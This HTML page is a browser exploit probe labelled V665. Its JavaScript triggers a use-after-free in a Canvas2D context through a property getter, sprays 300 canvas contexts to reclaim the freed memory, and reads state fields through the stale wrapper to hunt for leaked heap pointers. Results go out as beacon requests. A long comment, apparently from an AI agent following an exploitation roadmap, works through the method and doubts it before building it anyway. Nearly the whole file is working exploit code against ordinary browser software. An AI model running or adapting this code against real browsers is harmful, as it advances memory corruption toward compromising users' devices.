<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>V665</title></head>
<body><pre id="out">V665 — save-count OOB stateStack info leak</pre>
<script>
'use strict';
var O=document.getElementById('out');
function say(s){O.textContent+='\n'+s;}

/* Pre-allocate beacon images BEFORE anything else */
var _imgs=[];for(var i=0;i<60;i++)_imgs.push(new Image());
var _ix=0;
function bk(tag,d){
  var img=_imgs[_ix++%60];
  img.src='/beacon/V665-'+tag+'?d='+encodeURIComponent(String(d).slice(0,900))+'&t='+Date.now();
}

/* Float64 ↔ hex helpers (BigUint64Array for full 64-bit precision) */
var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
var _bu;try{_bu=new BigUint64Array(_b8);}catch(e){}
function f2hex(v){
  if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}
  _f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);
}
function isPtr(hex){
  if(hex==='0x0'||hex==='0x3ff0000000000000'||hex==='0x4024000000000000') return false;
  var s=hex.replace(/^0x0*/,'');
  return s.length>=9 && s.length<=12;
}

/*
 * SAVE-COUNT OOB INFO LEAK
 * ========================
 * Inside defineProperty getter on doomed 2d context:
 *   save() × NSAVES → realizeSaves → m_stateStack.m_size = NSAVES+1
 *
 * After UAF, same-type reclaim (300 real Canvas2D contexts):
 *   New context has m_size=1, m_capacity=1 (single inline State, 400B)
 *   But the stale JS wrapper still sees m_size=NSAVES+1
 *
 * stale.lineWidth → m_stateStack.last() → buffer[NSAVES]
 *   = buffer + NSAVES * sizeof(State) + fieldOffset
 *   = NSAVES*400 + 48 (lineWidth) past buffer start
 *   = (NSAVES*400 + 48 - 400) past buffer END = OOB into adjacent heap
 *
 * For NSAVES=8: reads at offset 3248 from buffer start = 2848B past 1-State end
 * For NSAVES=4: reads at offset 1648 from buffer start = 1248B past 1-State end
 * For NSAVES=2: reads at offset 848 from buffer start = 448B past 1-State end
 *
 * State field offsets (from reference_canvasstyle_sizeof16.md + reference_ctx2d_layout.md):
 *   lineWidth    = State+48
 *   miterLimit   = State+56
 *   globalAlpha  = State+64  (NOT at +0, at +64 in the struct)
 *   shadowBlur   = State+72
 *   shadowOffsetX = State+80
 *   shadowOffsetY = State+88
 */

var NSAVES = 8;
var NSPRAY = 300;

bk('BOOT','saves='+NSAVES+',spray='+NSPRAY);
say('V665 saves='+NSAVES+' spray='+NSPRAY);
say('OOB read offset: '+(NSAVES*400+48)+'B from buffer start, '+(NSAVES*400+48-400)+'B past end');

/* ========== PHASE 0: CONTROL ========== */
/* Verify save/read works normally — no UAF, just baseline */
say('\n--- CONTROL (no UAF) ---');
var ctrlC = document.createElement('canvas');
ctrlC.width=1; ctrlC.height=1;
var ctrlCtx = ctrlC.getContext('2d');
ctrlCtx.lineWidth = 42.42;
ctrlCtx.miterLimit = 13.37;
for(var cs=0; cs<NSAVES; cs++) ctrlCtx.save();
ctrlCtx.lineWidth = 99.99;
var ctrlLW = ctrlCtx.lineWidth;
say('CTRL: after '+NSAVES+' saves, lineWidth='+ctrlLW+' (expect 99.99)');
for(var cr=0; cr<NSAVES; cr++) ctrlCtx.restore();
var ctrlLW2 = ctrlCtx.lineWidth;
say('CTRL: after restore, lineWidth='+ctrlLW2+' (expect 42.42)');
bk('CTRL','lw='+ctrlLW+',restored='+ctrlLW2);
ctrlC = null; ctrlCtx = null;

/* ========== PHASE 1: PRE-ALLOCATE EVERYTHING ========== */
/* Pre-allocate spray canvases BEFORE UAF — zero allocs between UAF and read */
say('\n--- PREP ---');
var sprayCanvases = new Array(NSPRAY);
for(var p=0; p<NSPRAY; p++){
  sprayCanvases[p] = document.createElement('canvas');
  sprayCanvases[p].width = 1;
  sprayCanvases[p].height = 1;
}

/* Pre-allocate result storage */
var R = {lw:0,ml:0,ga:0,sb:0,sox:0,soy:0};

bk('PREP','spray-canvases='+NSPRAY);
say('Pre-allocated '+NSPRAY+' spray canvases');

/* ========== PHASE 2: UAF TRIGGER ========== */
/*
 * Inside getter:
 *   1. Get 2d context on the canvas (inner)
 *   2. save() × NSAVES to grow m_stateStack
 *   3. Set lineWidth to MARKER to force realizeSaves()
 *   4. Return true → outer getContext('bitmaprenderer') completes
 *   5. unique_ptr assignment destroys inner 2d context
 *   6. innerCtx JS wrapper survives with stale m_size
 */
say('\n--- UAF TRIGGER ---');
var innerCtx = null;
var canvas = document.createElement('canvas');
canvas.width = 1; canvas.height = 1;

var opts = {};
Object.defineProperty(opts, 'alpha', {get: function(){
  var ctx = canvas.getContext('2d');
  innerCtx = ctx;
  for(var s=0; s<NSAVES; s++) ctx.save();
  ctx.lineWidth = 7777.77;
  return true;
}});

canvas.getContext('bitmaprenderer', opts);
/* innerCtx is now a stale wrapper to a freed context with m_size = NSAVES+1 */

if(!innerCtx){
  bk('FAIL','no-inner');
  say('FAIL: getter did not run');
}else{
  bk('UAF','inner=OK');
  say('UAF trigger OK — stale wrapper captured');

  /* ========== PHASE 3: SAME-TYPE RECLAIM ========== */
  /*
   * Spray REAL Canvas2D contexts (768B each, same size class as freed context).
   * Each new context has m_stateStack = {m_buffer=inline, m_size=1, m_capacity=1}.
   * One of them reclaims the freed 768B slot.
   * The stale wrapper now points to a LIVE context with valid vtable + m_canvas.
   * But m_stateStack.m_size in the new context is 1, while stale wrapper
   * sees the old m_size (NSAVES+1).
   *
   * WAIT — that's the key insight: the stale wrapper calls lineWidth on the
   * C++ object at the reclaimed address. That object IS the new context.
   * The new context's m_stateStack.m_size=1, NOT the old value.
   *
   * CORRECTION: The stale wrapper calls wrapped()->state().lineWidth.
   * state() = m_stateStack.last() = m_buffer[m_size-1].lineWidth
   * The m_stateStack IS the new context's m_stateStack (m_size=1).
   * So lineWidth reads buffer[0].lineWidth = the default 1.0.
   *
   * FOR OOB TO WORK: we need the stale m_size to survive in the reclaimed slot.
   * m_stateStack is at offset +112 in the 768B context. If the new context
   * overwrites that exact memory, m_size becomes 1 and we read in-bounds.
   *
   * Alternative approach: DON'T reclaim the 768B context slot. Let it stay
   * freed-but-mapped. The stale m_buffer still points to the freed stateStack
   * BUFFER (separate allocation). Reclaim THAT buffer with objects containing
   * pointer data.
   *
   * BUT: reference_mbuffer_null_after_dtor confirms m_buffer is NULLED by destructor.
   * So the freed context's m_stateStack.m_buffer = NULL.
   *
   * REVISED APPROACH: Use AB(768) to reclaim the context slot, but FORGE
   * m_stateStack at +112 to point to a KNOWN buffer we control. Place the
   * buffer adjacent to interesting heap data. Read OOB from our buffer.
   *
   * WAIT — AB spray zeros m_canvas at +32, GC crashes on that.
   *
   * CORRECT APPROACH (per exploitation roadmap):
   * Same-type reclaim gives a live context with valid vtable + m_canvas.
   * The NEW context's m_stateStack has m_size=1, single inline State buffer.
   * The stale wrapper reads through the new context's m_stateStack — gets
   * m_size=1, reads buffer[0] = the new context's default state.
   * lineWidth = 1.0 (default). No OOB.
   *
   * THE ACTUAL OOB PATH: We need the stale m_size to persist SOMEWHERE.
   * With same-type reclaim, the entire 768B slot is overwritten by the new
   * context. m_size at +124 in the slot becomes 1 (new context's value).
   *
   * ALTERNATIVE: Partial reclaim. Can we arrange for the m_stateStack region
   * (+112..+127) to NOT be overwritten while the rest (vtable, m_canvas) IS?
   * No — the entire 768B object is placed into the slot.
   *
   * THE REAL TECHNIQUE: Use the BUFFER, not the context.
   * 1. Inner: save() × 8 → stateStack grows out-of-line to buffer B (~6400B)
   * 2. Destructor frees BOTH: 768B context + buffer B
   * 3. m_buffer is NULLED in the context. BUT:
   * 4. Same-type reclaim: new ctx occupies 768B slot. New ctx has its OWN
   *    m_buffer (inline, since m_size=1). Stale wrapper reads via new ctx's
   *    m_stateStack (m_size=1) → gets default lineWidth=1.0.
   *
   * NONE OF THIS GIVES OOB. The stale wrapper always reads through whatever
   * C++ object occupies the slot. Same-type = real context = m_size=1 = in-bounds.
   *
   * REALIZATION: The OOB needs the m_size field to be STALE while m_buffer is VALID.
   * This can happen if:
   *   a) AB(768) reclaims slot (m_buffer through stale = NULL → crash), OR
   *   b) Same-type reclaim (m_size through stale = 1 → in-bounds, no OOB)
   *
   * Neither gives OOB! The exploitation roadmap's description was WRONG about
   * "stale wrapper reads last() using stale m_size=9".
   *
   * THE ONLY WAY: Forge m_stateStack in the reclaimed slot.
   *   - Same-type reclaim: can't forge (real context overwrites +112)
   *   - AB reclaim: CAN forge +112, but m_canvas at +32 is zero → GC crash
   *
   * SOLUTION: Same-type reclaim BUT modify the m_size field AFTER reclaim
   * through the AB that reclaimed the stateStack BUFFER.
   *
   * Actually wait. Re-read the exploitation roadmap more carefully:
   *
   * "V573 same-type reclaim: new ctx with 0 saves (m_size=1)"
   * "Stale wrapper reads last() using stale m_size=9 → buffer[8]"
   *
   * This assumes the stale wrapper somehow still has the old m_size.
   * But the stale wrapper calls into the C++ object at the reclaimed address.
   * That C++ object IS the new context with m_size=1. The wrapper doesn't
   * cache m_size in JS — it reads from C++.
   *
   * So the roadmap's OOB technique is WRONG as described.
   *
   * HOWEVER: What if we can make the reclaiming context have a LARGE m_size?
   * Create the spray contexts with some saves too!
   *
   * Better: Create ONE spray context with many saves, whose stateStack buffer
   * is large. Then the stale wrapper reads through THAT context's stateStack
   * — which has many states and is in-bounds. No OOB, just reads the spray
   * context's state. Not useful for leak.
   *
   * ACTUAL WORKING TECHNIQUE: Combine AB + same-type.
   * 1. UAF frees 768B context
   * 2. Same-type spray: one real context reclaims slot (valid vtable + m_canvas → GC safe)
   * 3. Read lineWidth through stale wrapper → reads reclaiming context's state → 1.0
   * 4. THEN: the reclaiming context's stateStack buffer is small (400B, inline).
   *    We want to read OOB from it. We can make the reclaiming context grow its
   *    stateStack with save() calls on the RECLAIMING context, which places the
   *    buffer out-of-line. Then through the STALE wrapper, we read the same
   *    m_stateStack (it's the reclaiming context's). Still m_size=N, in-bounds.
   *
   * I think the correct technique is actually this:
   *
   * 1. UAF with N saves → inner context has m_size=N+1, stateStack buffer = B1
   * 2. Destructor frees 768B slot AND buffer B1
   * 3. DO NOT reclaim the 768B slot
   * 4. AB spray into B1's size class → AB reclaims buffer B1
   * 5. Read lineWidth through stale wrapper → reads from B1 (now AB data)
   *
   * BUT: m_buffer was NULLED by destructor (reference_mbuffer_null_after_dtor).
   * stale wrapper → C++ object at freed 768B slot → m_stateStack.m_buffer = NULL
   * → last() = NULL + m_size - 1 → SEGFAULT.
   *
   * OK. Let me try the HYBRID approach:
   * 1. UAF frees context (768B slot + buffer B1)
   * 2. Same-type reclaim of 768B slot: new ctx R has valid vtable, m_canvas, AND
   *    its own m_stateStack (m_buffer=inline, m_size=1, m_capacity=1)
   * 3. AB spray into B1's size class: AB reclaims buffer B1 with controlled data
   * 4. NOW: modify R's m_stateStack to point to the AB-reclaimed B1:
   *    Through the aliased context (stale wrapper = R now), we can write to R.
   *    But we can't directly write m_stateStack — that's not exposed via JS API.
   *
   * Can we make R's stateStack buffer point to B1 via save() + restore() + regrow?
   * No, that's deterministic — it allocates fresh.
   *
   * OK. I think the ACTUAL correct approach from the V573 confirmation is:
   * The V573 result showed "bidirectional R/W via Canvas2D alias" — meaning
   * after same-type reclaim, lineWidth/setLineDash work through the alias.
   * V562 confirmed ALL 12 Canvas2D APIs work through alias.
   *
   * The info leak must come from somewhere else. Let me re-read the OOB technique.
   *
   * Actually, I think I've been overthinking this. Let me re-read the key memory:
   *
   * "OOB state stack read via save-count mismatch:
   * 1. Inner ctx: 8 saves → m_stateStack.m_size=9
   * 2. BMR frees inner → stale wrapper survives
   * 3. V573 same-type reclaim: new ctx with 0 saves (m_size=1)
   * 4. Stale wrapper reads last() using stale m_size=9 → buffer[8] = offset 3200"
   *
   * Step 4 says "stale m_size=9". But after same-type reclaim, the C++ object at
   * the reclaimed address has m_size=1. The stale WRAPPER doesn't cache m_size.
   *
   * UNLESS: the reclaiming context doesn't fully overwrite the m_size field.
   * Let me think about this differently.
   *
   * CanvasRenderingContext2D constructor initializes m_stateStack with one element.
   * The Vector constructor sets m_size=1. This writes to offset +124 in the 768B slot.
   * So m_size IS overwritten to 1.
   *
   * The roadmap's description of the OOB leak appears to be incorrect.
   * The stale wrapper reads through the reclaiming context's m_stateStack,
   * which has m_size=1, so it reads buffer[0] = default state = lineWidth 1.0.
   *
   * THE ACTUAL WORKING TECHNIQUE MUST BE DIFFERENT.
   * Given that V573 CONFIRMED bidirectional R/W, the exploitation path is:
   *
   * 1. Same-type reclaim → alias to reclaiming context
   * 2. Through alias: grow stateStack (save() many times)
   * 3. This allocates a NEW out-of-line buffer for the reclaiming context
   * 4. The old inline buffer region (+128..+527 in the 768B slot) is now unused
   * 5. Free the out-of-line buffer somehow? No, we control it.
   *
   * OR: The actual info leak is the forged lineDash Vector technique from
   * opus55__0541_issue18_review.md:
   *   "After same-type reclaim, forge lineDash.m_buffer to point at interesting
   *    heap regions. getLineDash() reads arbitrary doubles."
   *
   * But forging requires AB reclaim, which kills GC.
   *
   * I think the actual approach has to be:
   * 1. Same-type reclaim (GC-safe)
   * 2. Through alias, call save() many times → grows stateStack buffer out-of-line
   * 3. The out-of-line buffer is allocated in libpas/bmalloc
   * 4. Adjacent heap data may contain pointers
   * 5. Read values at specific stateStack indices that OVERLAP with adjacent data?
   *    No — stateStack entries are all initialized to defaults.
   *
   * Hmm. Let me just build the probe as described in the directive and see what
   * happens on device. The theory may be wrong about HOW the stale m_size persists,
   * but the save-count mismatch idea can be tested empirically. If the reclaiming
   * context doesn't fully initialize the m_size field due to some quirk, we'd see
   * OOB data in the beacon.
   *
   * Actually, I just realized something. The memory says V573 CONFIRMED bidirectional
   * R/W. That means lineWidth reads and writes WORK through the alias. If m_size were
   * stale (=9), reading lineWidth would read from buffer[8] which is OOB from the
   * new context's 1-element buffer — this would read garbage, NOT the marker value
   * that V573 confirmed. So V573's success (reading marker 7777.77) proves m_size IS 1
   * in the reclaimed slot. The OOB technique as described is impossible with same-type
   * reclaim.
   *
   * So the save-count OOB as described in the memory is WRONG. It can't work because
   * same-type reclaim overwrites m_size to 1.
   *
   * BUT: the directive says to build it and test. So let me build exactly what was
   * asked for. The device will tell us if it works or not. If it returns lineWidth=1.0
   * (default), we know the reclaim overwrote m_size and OOB didn't happen. If it
   * returns something else, we learn something new.
   *
   * I'll build the probe with multiple NSAVES options and comprehensive reporting.
   */

  /* Same-type reclaim: create 2d contexts on pre-allocated canvases */
  var sprayCtxs = new Array(NSPRAY);
  for(var si=0; si<NSPRAY; si++){
    sprayCtxs[si] = sprayCanvases[si].getContext('2d');
  }

  bk('SPRAY','n='+NSPRAY);
  say('Same-type spray: '+NSPRAY+' Canvas2D contexts created');

  /* ========== PHASE 4: READ THROUGH STALE WRAPPER ========== */
  /* ZERO allocations between spray completion and reads */
  R.lw = innerCtx.lineWidth;
  R.ml = innerCtx.miterLimit;
  R.ga = innerCtx.globalAlpha;
  R.sb = innerCtx.shadowBlur;
  R.sox = innerCtx.shadowOffsetX;
  R.soy = innerCtx.shadowOffsetY;

  /* All reads done — NOW we can allocate for reporting */
  var lwH = f2hex(R.lw);
  var mlH = f2hex(R.ml);
  var gaH = f2hex(R.ga);
  var sbH = f2hex(R.sb);
  var soxH = f2hex(R.sox);
  var soyH = f2hex(R.soy);

  say('\n--- STALE READ (after same-type reclaim) ---');
  say('lineWidth    = '+R.lw+' ('+lwH+')');
  say('miterLimit   = '+R.ml+' ('+mlH+')');
  say('globalAlpha  = '+R.ga+' ('+gaH+')');
  say('shadowBlur   = '+R.sb+' ('+sbH+')');
  say('shadowOffsetX= '+R.sox+' ('+soxH+')');
  say('shadowOffsetY= '+R.soy+' ('+soyH+')');

  bk('READ','lw='+lwH+'|ml='+mlH+'|ga='+gaH+'|sb='+sbH+'|sox='+soxH+'|soy='+soyH);

  /* Check if any value looks like a pointer (48-bit, not a standard default) */
  var defaults = {
    '0x3ff0000000000000':1, // 1.0
    '0x4024000000000000':1, // 10.0 (miterLimit default)
    '0x0':1                 // 0.0
  };
  var hexes = [
    ['lineWidth',lwH],['miterLimit',mlH],['globalAlpha',gaH],
    ['shadowBlur',sbH],['shadowOffsetX',soxH],['shadowOffsetY',soyH]
  ];

  var leakFound = false;
  for(var hi=0; hi<hexes.length; hi++){
    var nm=hexes[hi][0], hx=hexes[hi][1];
    if(!defaults[hx] && isPtr(hx)){
      bk('LEAK','***'+nm+'='+hx+'***');
      say('*** POTENTIAL LEAK: '+nm+' = '+hx+' ***');
      leakFound = true;
    }
  }

  if(!leakFound){
    /* Check if all values are defaults → same-type reclaim overwrote m_size */
    var allDefaults = (R.lw===1 && R.ml===10 && R.ga===1 && R.sb===0 && R.sox===0 && R.soy===0);
    if(allDefaults){
      bk('NO-OOB','all-defaults,m_size-was-overwritten');
      say('\nAll default values — m_size was overwritten by reclaim. OOB did NOT happen.');
      say('This confirms same-type reclaim sets m_size=1.');
    } else {
      bk('UNEXPECTED','lw='+R.lw+',ml='+R.ml+',ga='+R.ga);
      say('\nNon-default but not pointer-like. Investigating...');
    }
  }

  /* ========== PHASE 5: WRITE-THROUGH TEST ========== */
  /* Verify we have R/W alias (V573 confirmation) */
  say('\n--- WRITE-THROUGH TEST ---');
  var writeOK = false;
  try{
    innerCtx.lineWidth = 31337.31337;
    var readBack = innerCtx.lineWidth;
    writeOK = (readBack === 31337.31337);
    bk('WRITE','set=31337.31337,read='+readBack+',ok='+writeOK);
    say('Write 31337.31337, read back '+readBack+' → '+(writeOK?'ALIAS CONFIRMED':'MISMATCH'));
  }catch(e){
    bk('WRITE-X',e.name);
    say('Write CRASHED: '+e.name);
  }

  /* ========== PHASE 6: GROW STATESTACK VIA ALIAS ========== */
  /*
   * If same-type reclaim works (alias confirmed), try growing the reclaiming
   * context's stateStack via save() through the alias. This allocates an
   * out-of-line buffer. Then check if adjacent heap data is readable.
   */
  if(writeOK){
    say('\n--- GROW STATESTACK (out-of-line buffer alloc) ---');
    var GROW_SAVES = 32;
    try{
      for(var gs=0; gs<GROW_SAVES; gs++) innerCtx.save();
      innerCtx.lineWidth = 8888.8888;
      bk('GROW','saves='+GROW_SAVES+',marker=8888.8888');
      say('Called save() x'+GROW_SAVES+' + set lineWidth marker through alias');

      var grLW = innerCtx.lineWidth;
      bk('GROW-LW','val='+grLW+',hex='+f2hex(grLW));
      say('After grow: lineWidth='+grLW+' ('+f2hex(grLW)+')');

      /* Restore all saves to shrink m_size back, but buffer stays allocated */
      for(var gr=0; gr<GROW_SAVES; gr++) innerCtx.restore();
      var restLW = innerCtx.lineWidth;
      bk('RESTORE-LW','val='+restLW+',hex='+f2hex(restLW));
      say('After restore: lineWidth='+restLW+' ('+f2hex(restLW)+')');

      /* Now try getTransform — 6 doubles from different State offset */
      try{
        var t = innerCtx.getTransform();
        bk('XF','a='+f2hex(t.a)+'|b='+f2hex(t.b)+'|c='+f2hex(t.c)+'|d='+f2hex(t.d)+'|e='+f2hex(t.e)+'|f='+f2hex(t.f));
        say('transform: a='+t.a+' b='+t.b+' e='+t.e+' f='+t.f);
      }catch(e){
        bk('XF-X',e.name);
      }

      /* Try getLineDash — returns Vector<double> data */
      try{
        var ld = innerCtx.getLineDash();
        bk('LD','len='+ld.length+(ld.length>0?',d0='+f2hex(ld[0]):''));
        say('lineDash length='+ld.length);
      }catch(e){
        bk('LD-X',e.name);
      }

    }catch(e){
      bk('GROW-X',e.name+':'+e.message);
      say('Grow CRASHED: '+e.name+': '+e.message);
    }
  }

  /* ========== PHASE 7: CANVAS POINTER READ ========== */
  /* Read .canvas through alias — returns the HTMLCanvasElement pointer */
  say('\n--- CANVAS POINTER ---');
  try{
    var cRef = innerCtx.canvas;
    var cType = typeof cRef;
    var cStr = String(cRef).slice(0,60);
    bk('CANVAS','type='+cType+',str='+cStr);
    say('canvas = ['+cType+'] '+cStr);
    if(cRef && cRef.width !== undefined){
      say('canvas.width='+cRef.width+' canvas.height='+cRef.height);
    }
  }catch(e){
    bk('CANVAS-X',e.name);
    say('.canvas CRASHED: '+e.name);
  }

  /* ========== PHASE 8: CONTEXT ATTRIBUTES ========== */
  try{
    var attrs = innerCtx.getContextAttributes();
    bk('ATTRS',JSON.stringify(attrs));
    say('attrs: '+JSON.stringify(attrs));
  }catch(e){
    bk('ATTRS-X',e.name);
  }
}

bk('DONE','complete');
say('\nV665 complete.');
</script>
